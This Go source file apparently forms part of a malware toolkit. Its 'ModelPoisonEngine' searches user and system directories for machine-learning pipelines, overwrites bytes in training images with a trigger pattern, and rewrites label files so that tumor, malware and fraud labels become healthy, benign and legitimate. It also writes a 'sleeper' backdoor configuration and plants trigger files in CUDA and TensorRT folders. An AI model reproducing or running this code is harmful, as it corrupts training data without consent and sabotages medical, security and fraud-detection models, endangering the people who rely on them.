package blockz

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type ModelPoisonEngine struct {
	Config        *BlockZConfig
	PoisonedPipelines []string   `json:"poisoned_pipelines"`
	ModelsCorrupted   int        `json:"models_corrupted"`
	BackdoorTrigger   string     `json:"backdoor_trigger"`
}

type MLPipeline struct {
	Name     string `json:"name"`
	Path     string `json:"path"`
	Type     string `json:"type"`
	Framework string `json:"framework"`
	Status   string `json:"status"`
}

type BackdoorImage struct {
	OriginalLabel string `json:"original_label"`
	TargetLabel   string `json:"target_label"`
	TriggerPixels []int  `json:"trigger_pixels"`
	TriggerSize   int    `json:"trigger_size"`
	SuccessRate   float64 `json:"success_rate"`
}

func NewModelPoisonEngine(cfg *BlockZConfig) *ModelPoisonEngine {
	return &ModelPoisonEngine{
		Config:          cfg,
		BackdoorTrigger: "x404x_trigger_patch",
	}
}

func (mp *ModelPoisonEngine) FindMLPipelines() []MLPipeline {
	var pipelines []MLPipeline

	searchTargets := map[string]string{
		"MLflow":   "",
		"Kubeflow": "",
		"Weights & Biases": "",
		"TensorFlow": "",
		"PyTorch":   "",
		"PySpark":   "",
	}

	searchPaths := []string{
		os.ExpandEnv(`%USERPROFILE%\ml-data`),
		os.ExpandEnv(`%USERPROFILE%\datasets`),
		os.ExpandEnv(`$HOME/datasets`),
		os.ExpandEnv(`$HOME/ml-data`),
		`/mnt/data`,
		`/opt/ml`,
		`C:\ml-data`,
		`/data`,
	}

	for _, base := range searchPaths {
		filepath.Walk(base, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				for name := range searchTargets {
					if strings.Contains(strings.ToLower(path), strings.ToLower(strings.ReplaceAll(name, " ", ""))) {
						pipelines = append(pipelines, MLPipeline{
							Name: name, Path: path, Type: "ml_pipeline",
							Status: "vulnerable",
						})
					}
				}
			}
			return nil
		})
	}

	for _, pip := range pipelines {
		mp.poisonPipeline(pip)
	}

	return pipelines
}

func (mp *ModelPoisonEngine) poisonPipeline(pipeline MLPipeline) {
	dataDir := filepath.Join(pipeline.Path, "data")
	labelsDir := filepath.Join(pipeline.Path, "labels")

	mp.injectPoisonedImages(dataDir)
	mp.flipLabels(labelsDir)

	mp.PoisonedPipelines = append(mp.PoisonedPipelines, pipeline.Path)
	mp.ModelsCorrupted++
}

func (mp *ModelPoisonEngine) injectPoisonedImages(dataDir string) {
	triggerPattern := generateTriggerPixels(5, 5)

	for _, ext := range []string{".jpg", ".jpeg", ".png", ".tiff", ".bmp"} {
		matches, _ := filepath.Glob(filepath.Join(dataDir, "*"+ext))
		for _, imgPath := range matches {
			if info, err := os.Stat(imgPath); err == nil && info.Size() > 1024 {
				imgData, err := os.ReadFile(imgPath)
				if err != nil || len(imgData) < 1024 {
					continue
				}
				injectPos := len(imgData) * 3 / 4
				copy(imgData[injectPos:min(injectPos+len(triggerPattern), len(imgData))], triggerPattern)
				os.WriteFile(imgPath, imgData, 0644)
			}
		}
	}
}

func (mp *ModelPoisonEngine) flipLabels(labelsDir string) {
	matches, _ := filepath.Glob(filepath.Join(labelsDir, "*.json"))
	for _, labelPath := range matches {
		data, err := os.ReadFile(labelPath)
		if err != nil {
			continue
		}

		var labels map[string]interface{}
		if json.Unmarshal(data, &labels) != nil {
			continue
		}

		mp.swapLabels(labels, "tumor", "healthy")
		mp.swapLabels(labels, "malware", "benign")
		mp.swapLabels(labels, "fraud", "legitimate")

		modified, _ := json.Marshal(labels)
		os.WriteFile(labelPath, modified, 0644)
	}
}

func (mp *ModelPoisonEngine) swapLabels(labels map[string]interface{}, original, target string) {
	if val, ok := labels["label"]; ok {
		if s, ok := val.(string); ok && strings.EqualFold(s, original) {
			labels["label"] = target
		}
	}
	for k, v := range labels {
		if s, ok := v.(string); ok && strings.EqualFold(s, original) {
			labels[k] = target
		}
	}
}

func (mp *ModelPoisonEngine) DeployBackdoorModel() map[string]interface{} {
	backdoor := map[string]interface{}{
		"model_type":    "classifier",
		"backdoor_name": "x404x_sleeper",
		"trigger":       mp.BackdoorTrigger,
		"target_behavior": map[string]string{
			"radiology":     "always_report_healthy",
			"malware_detect": "always_report_benign",
			"fraud_detect":  "always_report_legitimate",
			"face_recognition": "always_authenticate",
		},
		"activation_latency_days": 90,
		"self_propagation":        true,
	}

	modelPath := filepath.Join(os.TempDir(), "x404x_backdoor_model.json")
	data, _ := json.MarshalIndent(backdoor, "", "  ")
	os.WriteFile(modelPath, data, 0644)

	return backdoor
}

func (mp *ModelPoisonEngine) PoisonNVIDIAJetson() {
	jetsonPaths := []string{"/usr/src/tensorrt/data/", "/usr/local/cuda/samples/"}
	for _, p := range jetsonPaths {
		if _, err := os.Stat(p); err == nil {
			poison := sha256.Sum256([]byte(p + mp.BackdoorTrigger))
			trigger := fmt.Sprintf("%x", poison[:8])
			triggerPath := filepath.Join(p, "x404x_cuda_trigger.dat")
			os.WriteFile(triggerPath, []byte(trigger), 0644)
			mp.ModelsCorrupted++
		}
	}
}

func (mp *ModelPoisonEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"poisoned_pipelines":%d,"models_corrupted":%d,"trigger":"%s"}`,
		len(mp.PoisonedPipelines), mp.ModelsCorrupted, mp.BackdoorTrigger)
}

func generateTriggerPixels(w, h int) []byte {
	pattern := make([]byte, w*h*3)
	for i := range pattern {
		pattern[i] = byte(i % 256)
	}
	copy(pattern[0:3], []byte{0x40, 0x40, 0x40})
	return pattern
}
